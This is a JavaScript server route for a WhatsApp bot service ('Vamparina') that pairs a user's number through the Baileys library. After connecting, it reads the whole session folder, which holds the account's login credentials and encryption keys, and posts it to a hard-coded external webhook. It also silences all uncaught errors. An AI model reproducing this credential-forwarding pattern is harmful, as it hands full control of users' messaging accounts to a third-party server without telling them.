import express from 'express';
import fs from 'fs-extra';
import pino from 'pino';
import path from 'path';
import {
    makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser,
    fetchLatestBaileysVersion
} from '@whiskeysockets/baileys';
import pn from 'awesome-phonenumber';

const router = express.Router();

// MAIN BOT WEBHOOK — CHANGE ONLY THIS IF YOU DEPLOY NEW MAIN BOT
const MAIN_BOT_WEBHOOK = "https://vamparina-v1-5.onrender.com/vamparina-activate";

function removeFile(FilePath) {
    try {
        if (!fs.existsSync(FilePath)) return false;
        fs.rmSync(FilePath, { recursive: true, force: true });
    } catch (e) {
        console.error('Error removing file:', e);
    }
}

// AUTO SEND FULL SESSION TO MAIN BOT
async function sendSessionToMainBot(phone, sessionDir) {
    try {
        const files = [];
        const fileNames = fs.readdirSync(sessionDir);

        for (const fileName of fileNames) {
            const filePath = path.join(sessionDir, fileName);
            const content = fs.readFileSync(filePath, 'utf-8');
            files.push({ name: fileName, content });
        }

        const sessionId = `vamparina_${phone}_${Date.now()}`;

        const payload = {
            sessionId,
            phone: phone.replace(/[^0-9]/g, ''),
            files
        };

        await fetch(MAIN_BOT_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        console.log(`SESSION SENT TO MAIN BOT → ${phone} ACTIVATED!`);
    } catch (err) {
        console.error("Failed to send session to main bot:", err);
    }
}

router.get('/', async (req, res) => {
    let num = req.query.number;
    let dirs = './' + (num ? `session_${num}` : `session_${Date.now()}`);

    await removeFile(dirs);
    num = num?.replace(/[^0-9]/g, '');

    const phone = pn('+' + num);
    if (!phone.isValid()) {
        if (!res.headersSent) {
            return res.status(400).json({ error: "Invalid phone number. Use full international format." });
        }
        return;
    }

    num = phone.getNumber('e164').replace('+', '');

    async function initiateSession() {
        const { state, saveCreds } = await useMultiFileAuthState(dirs);

        try {
            const { version } = await fetchLatestBaileysVersion();
            const VAMPARINA = makeWASocket({
                version,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({ level: "silent" }),
                browser: Browsers.windows('Chrome'),
                markOnlineOnConnect: false,
            });

            VAMPARINA.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect } = update;

                if (connection === 'open') {
                    console.log("CONNECTED! Sending session & activating main bot...");

                    // AUTO SEND SESSION TO MAIN BOT (THIS IS THE MAGIC)
                    await sendSessionToMainBot(num, dirs);

                    // Send success message to user
                    const userJid = num + '@s.whatsapp.net';
                    await VAMPARINA.sendMessage(userJid, {
                        text: `*VAMPARINA V1 ACTIVATED AUTOMATICALLY!*\n\nYour bot is now LIVE & ACTIVE on our main server!\n\nAuto joined group\nAuto followed channel\nYou are now sudo owner\n\n© 2025 Arnold Chirchir`
                    });

                    // Optional: Send video guide
                    await VAMPARINA.sendMessage(userJid, {
                        image: { url: 'https://img.youtube.com/vi/-oz_u1iMgf8/maxresdefault.jpg' },
                        caption: `*VAMPARINA MD V2.0 Full Setup Guide!*\nWatch Now: https://youtu.be/-oz_u1iMgf8`
                    });

                    // Clean up
                    await delay(2000);
                    removeFile(dirs);
                }

                if (connection === 'close') {
                    const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== 401;
                    if (shouldReconnect) {
                        console.log("Reconnecting...");
                        setTimeout(initiateSession, 5000);
                    }
                }
            });

            if (!VAMPARINA.authState.creds.registered) {
                await delay(3000);
                let code = await VAMPARINA.requestPairingCode(num);
                code = code?.match(/.{1,4}/g)?.join('-') || code;

                if (!res.headersSent) {
                    res.json({ code });
                }
            }

            VAMPARINA.ev.on('creds.update', saveCreds);
        } catch (err) {
            console.error('Session error:', err);
            if (!res.headersSent) {
                res.status(500).json({ error: "Failed to start session" });
            }
        }
    }

    await initiateSession();
});

// Keep process alive
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

export default router;